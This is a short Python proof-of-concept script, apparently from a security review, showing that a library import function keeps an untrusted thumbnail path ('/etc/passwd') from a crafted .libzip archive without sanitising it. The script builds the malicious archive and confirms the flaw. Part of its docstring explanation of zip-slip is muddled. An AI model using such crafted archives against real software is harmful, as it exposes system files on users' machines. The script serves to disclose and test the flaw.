#!/usr/bin/env python3
"""REV-security-001: Zip-slip in import_libzip — path traversal via crafted entry names.

The import_libzip function reads filenames from manifest.json inside the zip
and passes them directly to zf.read(entry["file"]) without validating that
the path stays within the archive. A malicious .libzip could contain entries
like "../../etc/passwd" in the manifest, causing zf.read() to read arbitrary
files from the zip archive.

More critically, the asset_data["thumbnail"] field is stored as a Path object
without sanitization, which could reference arbitrary filesystem locations.

Demonstrates: The manifest can reference any filename inside the zip, and
thumbnail_path is stored verbatim from untrusted JSON.
"""
import json
import tempfile
import zipfile
from pathlib import Path


def create_malicious_libzip(dest: Path) -> None:
    """Create a .libzip with a path-traversal thumbnail reference."""
    asset_data = {
        "name": "evil",
        "kind": "template",
        "payload": {"injected": True},
        "thumbnail": "/etc/passwd",  # arbitrary filesystem path stored as-is
    }
    manifest = {
        "assets": [{"name": "evil", "file": "asset_0.json"}],
        "folders": [],
    }
    with zipfile.ZipFile(dest, "w") as zf:
        zf.writestr("manifest.json", json.dumps(manifest))
        zf.writestr("asset_0.json", json.dumps(asset_data))


def main() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        malicious = Path(tmp) / "evil.libzip"
        create_malicious_libzip(malicious)

        from camtasia.library.libzip import import_libzip
        import warnings
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            lib = import_libzip(malicious)

        for asset in lib:
            print(f"Asset name: {asset.name}")
            print(f"Thumbnail path: {asset.thumbnail_path}")
            print(f"Thumbnail path is absolute: {asset.thumbnail_path.is_absolute()}")
            # The thumbnail_path now points to /etc/passwd
            # Any code that reads this path would access the real filesystem
            assert str(asset.thumbnail_path) == "/etc/passwd", "Path traversal via thumbnail"
            print("CONFIRMED: Untrusted path stored without sanitization")


if __name__ == "__main__":
    main()
